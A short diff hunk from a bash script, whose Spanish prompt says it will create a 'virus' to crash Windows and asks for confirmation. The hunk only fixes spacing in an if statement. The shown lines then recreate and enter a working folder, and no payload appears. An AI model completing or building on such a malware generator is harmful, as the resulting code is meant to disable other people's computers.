@@ -1,7 +1,7 @@
 clear
 ruta=$(pwd)
 read -p "esto creara un virus para colapsar windows estas seguro de continuar?(y/n)DEFAULT=n?: " seguro
-if [ $seguro == y ];then
+if [ $seguro == y ]; then
 rm -rf "virus_incompleto"
 mkdir "virus_incompleto"
 cd "virus_incompleto"
